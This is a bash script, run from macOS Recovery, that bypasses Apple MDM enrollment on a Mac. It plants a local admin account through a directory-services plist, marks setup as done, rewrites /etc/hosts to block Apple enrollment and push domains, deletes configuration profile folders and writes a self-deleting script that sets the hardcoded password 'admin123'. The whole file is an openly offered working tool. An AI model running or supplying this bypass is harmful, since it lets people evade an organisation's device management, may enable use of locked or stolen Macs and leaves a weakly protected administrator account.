#!/bin/bash

# Text formatting
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
NC='\033[0m'

echo -e "${BLUE}Starting MDM bypass for ale volumes...${NC}"

# Define volume names
SYSTEM_VOLUME="ale"
DATA_VOLUME="ale - Data"

# Mount volumes
echo -e "${BLUE}Mounting volumes...${NC}"
diskutil mount "/Volumes/$SYSTEM_VOLUME" || true
diskutil mount "/Volumes/$DATA_VOLUME" || true

# Create directories
echo -e "${BLUE}Creating directories...${NC}"
mkdir -p "/Volumes/$DATA_VOLUME/private/var/db/dslocal/nodes/Default/users"
mkdir -p "/Volumes/$DATA_VOLUME/private/var/db/dslocal/nodes/Default/groups"
mkdir -p "/Volumes/$DATA_VOLUME/Users/admin"
mkdir -p "/Volumes/$SYSTEM_VOLUME/private/var/db"
mkdir -p "/Volumes/$DATA_VOLUME/private/var/db"

# Create admin user
echo -e "${BLUE}Creating admin user...${NC}"
cat > "/Volumes/$DATA_VOLUME/private/var/db/dslocal/nodes/Default/users/admin.plist" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>name</key>
    <array>
        <string>admin</string>
    </array>
    <key>passwd</key>
    <array>
        <string>********</string>
    </array>
    <key>uid</key>
    <array>
        <string>501</string>
    </array>
    <key>gid</key>
    <array>
        <string>20</string>
    </array>
    <key>shell</key>
    <array>
        <string>/bin/zsh</string>
    </array>
    <key>home</key>
    <array>
        <string>/Users/admin</string>
    </array>
    <key>realname</key>
    <array>
        <string>Administrator</string>
    </array>
    <key>authentication_authority</key>
    <array>
        <string>;ShadowHash;</string>
    </array>
</dict>
</plist>
EOF

# Set permissions
chown -R 501:20 "/Volumes/$DATA_VOLUME/Users/admin"
chmod 700 "/Volumes/$DATA_VOLUME/Users/admin"

# Create setup files
echo -e "${BLUE}Creating setup files...${NC}"
for setup_file in ".AppleSetupDone" ".AppleDiagnosticsSetupDone" ".AppleDesktopSetupDone"; do
    touch "/Volumes/$DATA_VOLUME/private/var/db/$setup_file"
    touch "/Volumes/$SYSTEM_VOLUME/private/var/db/$setup_file"
done

# Block MDM domains
echo -e "${BLUE}Blocking MDM domains...${NC}"
for vol in "$SYSTEM_VOLUME" "$DATA_VOLUME"; do
    mkdir -p "/Volumes/$vol/etc"
    cat > "/Volumes/$vol/etc/hosts" << EOF
127.0.0.1 localhost
::1 localhost
0.0.0.0 deviceenrollment.apple.com
0.0.0.0 mdmenrollment.apple.com
0.0.0.0 iprofiles.apple.com
0.0.0.0 albert.apple.com
0.0.0.0 identity.apple.com
0.0.0.0 push.apple.com
0.0.0.0 comm.support.apple.com
0.0.0.0 axm-adm-enroll.apple.com
0.0.0.0 setup.icloud.com
0.0.0.0 sq-device.apple.com
0.0.0.0 profiles.apple.com
EOF
done

# Remove MDM profiles
echo -e "${BLUE}Removing MDM configurations...${NC}"
rm -rf "/Volumes/$SYSTEM_VOLUME/var/db/ConfigurationProfiles"
rm -rf "/Volumes/$DATA_VOLUME/var/db/ConfigurationProfiles"
rm -rf "/Volumes/$SYSTEM_VOLUME/Library/ConfigurationProfiles"
rm -rf "/Volumes/$DATA_VOLUME/Library/ConfigurationProfiles"

# Create autorun script
echo -e "${BLUE}Creating autorun script...${NC}"
mkdir -p "/Volumes/$DATA_VOLUME/private/var/root"
cat > "/Volumes/$DATA_VOLUME/private/var/root/finishsetup.sh" << EOF
#!/bin/bash
dscl . -passwd /Users/admin "admin123"
rm -f "\$0"
EOF

chmod +x "/Volumes/$DATA_VOLUME/private/var/root/finishsetup.sh"

echo -e "${GREEN}Process completed!${NC}"
echo -e "${BLUE}Next steps:${NC}"
echo -e "1. Restart your Mac"
echo -e "2. If you see MDM screen, press Command + Q"
echo -e "3. Login with:"
echo -e "   Username: admin"
echo -e "   Password: admin123"
echo -e "\n${RED}If setup screen persists:${NC}"
echo -e "1. Boot to Recovery Mode again (Command + R)"
echo -e "2. Open Disk Utility"
echo -e "3. Click 'Mount' on both volumes if not mounted"
echo -e "4. Run script again"
